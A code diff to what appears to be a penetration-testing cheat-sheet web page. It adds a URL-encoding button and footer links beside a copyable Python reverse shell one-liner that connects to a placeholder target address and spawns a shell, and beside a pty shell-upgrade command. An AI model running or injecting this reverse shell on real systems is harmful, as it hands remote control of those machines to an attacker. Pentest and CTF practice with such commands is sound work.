@@ -91,7 +91,7 @@
 
     <h3>Reverse Shell.</h3>
     <h4>python3</h4>
-    <p id="command12">$<span id="commandText12">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$target_ip",$target_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><button id="copyButton12">Copy</button></p>
+    <p id="command12">$<span id="commandText12">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$target_ip",$target_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><button id="copyButton12">Copy</button> <button id="encodeButton">URL</button></p>
 
     <h3>Spawn Shell.</h3>
     <p id="command12">$<span id="commandText12">python3 -c 'import pty; pty.spawn("/bin/bash")'</span><button id="copyButton12">Copy</button></p>
@@ -100,7 +100,8 @@
 
 <footer>
   <p> > <a hrefa href="index.html">Home</a> > <a href="overview.html">OverView</a></p>
-  <p>Please forrow me on <a href="https://twitter.com/yunolay">Twitter</a>.</p>
+  <p> > Please forrow me on <a href="https://twitter.com/yunolay">Twitter</a>.</p>
+  <p> > Buy me a <a here="https://www.buymeacoffee.com/yunolay0704">coffee</a>.</p>
 </footer>
 
 <script>
@@ -252,6 +253,12 @@
   }
 
   <!-- TODO: Create a button for URL encoding. -->
+  document.getElementById('encodeButton').addEventListener('click', function() {
+    var commandTextElement = document.getElementById('commandText12');
+    var commandText = commandTextElement.innerHTML;
+    var encodedCommandText = encodeURIComponent(commandText);
+    commandTextElement.innerHTML = encodedCommandText;
+  });
 </script>
 
 </body>
